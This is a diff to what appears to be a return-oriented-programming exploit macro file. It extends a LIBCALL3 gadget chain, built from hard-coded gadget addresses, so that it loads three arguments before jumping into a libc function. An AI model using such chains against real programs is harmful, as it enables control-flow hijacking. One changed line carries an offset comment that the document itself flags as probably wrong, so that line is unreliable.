@@ -60,6 +60,7 @@ SYSCALL3 :=
   ret &0x11724b ; perform syscall
 
 LIBCALL3 imm64 :=
+  /* setup special stack record for libc function */
   ret &0x30e95 + 1
   resq 2          ; part of above gadget   ; MOV rax,rbp    -- destroys rbp
   ADD rax,-32   ; rax points to OLD rbp entry (not yet initialized) 32 = 4*8
@@ -71,7 +72,7 @@ LIBCALL3 imm64 :=
   MOV [rdx],rcx ; store return rbp value
   ADD rax,-8    ; destroys rdi / rax points to r.a. entry in stack record
   MOV rdx,rax   ; 
-  MOV rdi,$+144 ; 2 rdi = return address / 8*18 = 144
+  MOV rdi,$+384 ; 2 rdi = return address / 8*48 = 144 -- probably computed wrong
   MOV [rdx],rdi ; 1 store return address on stack
   ADD rax,-8    ; 3
   MOV rdx,rax   ; 1
@@ -81,7 +82,27 @@ LIBCALL3 imm64 :=
   MOV rdx,rax   ; 1
   MOV rdi,imm64 ; 2 rdi = libc function address
   MOV [rdx],rdi ; 1 store libc function address on stack
-  ret &0x109cf5  ; 1 leave (mov rsp,rbp \ pop rbp)
+  
+  /* load arguments into registers */
+  ADD rax,32    ; 3 index of arg2: 8*4=-32
+  MOV r9,rax    ; 4 preserve rax / destroys r12,r13,r14
+  MOV rax,[rax] ; 1 load arg2
+  MOV rsi,rax   ; 1 destroys rdi / arg2 in place
+  MOV rax,r9    ; 2 restore rax / destroys r14
+  ADD rax,8     ; 3 rax <- index of arg3 / destroys rdi
+  MOV r9,rax    ; 4 r9 <- index of arg3 / destroys r12,r13,r14
+  ADD rax,-16   ; 3 rax <- index of arg1 / destroys rdi
+  MOV rax,[rax] ; 1 rax <- arg1
+  MOV rdx,rax   ; 1
+  MOV rdi,rdx   ; 3 arg1,arg2 in place / destroys rax
+  MOV rax,r9    ; 2 destroys r14
+  MOV rax,[rax] ; 1 rax <- arg3
+  MOV rdx,rax   ; 1 arg1,arg2,arg3 in place
+  
+  /* transfer control to libc function */
+  ret &0x109cf5 ; 1 leave (mov rsp,rbp \ pop rbp)
+  
+
 
 /*
 ----------
